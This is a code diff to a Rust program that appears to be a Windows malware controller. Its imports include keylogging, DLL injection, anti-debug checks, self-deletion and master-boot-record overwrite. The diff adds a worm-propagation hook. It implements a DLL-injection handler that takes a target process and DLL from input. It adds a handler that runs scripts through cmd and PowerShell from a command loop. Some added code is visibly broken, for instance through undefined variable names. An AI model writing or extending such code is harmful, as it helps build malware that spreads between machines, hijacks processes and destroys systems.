@@ -5,11 +5,13 @@ mod BasicCryptoAlgos;
 mod maliciousScripts;
 mod AntiDebugChecks;
 mod MayDay;
+mod Worming;
 
 
 // use keylogger::keylogger::keylog;
 // use helper_fns::mem_alloc::mem_alloc;
 use dllinjection::injector::inject_dll;
+use Worming::worm::start_worming;
 use MayDay::self_delete::{self_del, NULL};
 use MayDay::mbr_overwrite::mbr;
 use winapi::shared::windot11::PDOT11_PORT_STATE_NOTIFICATION;
@@ -25,6 +27,7 @@ use std::io::{self, Bytes, Read, Write};
 use std::net::{Ipv4Addr,SocketAddrV4};
 use std::net::Shutdown;
 use std::net::{TcpStream,TcpListener};
+use std::process::Command;
 
 const ADDR:Ipv4Addr = Ipv4Addr::new(127,0,0,1);
 //This is the constant address made for the socket
@@ -68,13 +71,26 @@ fn connect()->io::Result<()>{
     Ok(())
 }
 fn handle_dll_injection(){
-
+    println!("Enter <processName> <DllName> : ");
+    let mut input = String::new();
+    io::stdin().read_line(&mut input);
+    let process_name = input
+                        .split_ascii_whitespace()
+                        .nth(1)
+                        .unwrap()
+                        .to_string();
+    let dll_name = input
+                        .split_ascii_whitespace()
+                        .nth(2)
+                        .unwrap()
+                        .to_string();
+    inject_dll(processName, dllName);
 }
 fn handle_mbr_overwrite(){
 
 }
 fn handle_worming(){
-
+    start_worming();
 }
 
 fn handle_self_delete(){
@@ -87,6 +103,31 @@ fn handle_obfuscation(){
 
 }
 fn handle_scripts(){
+    println!("Enter : Run <script_name>");
+    let mut input = String::new();
+    io::stdin().read_line(&mut input);
+    let script_name = input.split_ascii_whitespace().nth(1).unwrap().to_string();
+    match script_name.split('.').nth(1).unwrap(){
+        "rs" =>{
+            let output = Command::new("cmd")
+            .args(&["/C",format!("rustc {}",script_name.split('.').nth(0).unwrap().to_string()) as &str])
+            .output()
+            .expect("Error running the script");
+        },
+        "ps1" => {
+            let output = Command::new("powershell")
+            .args(&["-Command", script_name.split('.').nth(1).unwrap()])
+            .output()
+            .expect("Failed to execute command");
+        },
+        "cs" => {
+            let output = Command::new("cmd")
+            .args(&["/C",format!("csi {}",script_name.split('.').nth(0).unwrap().to_string()) as &str])
+            .output()
+            .expect("Error running the script");
+        },
+        _ => {eprintln!("Script does not exist")},
+        };
 
 }
 fn handle_commands(mut stream:TcpStream) -> io::Result<()>{
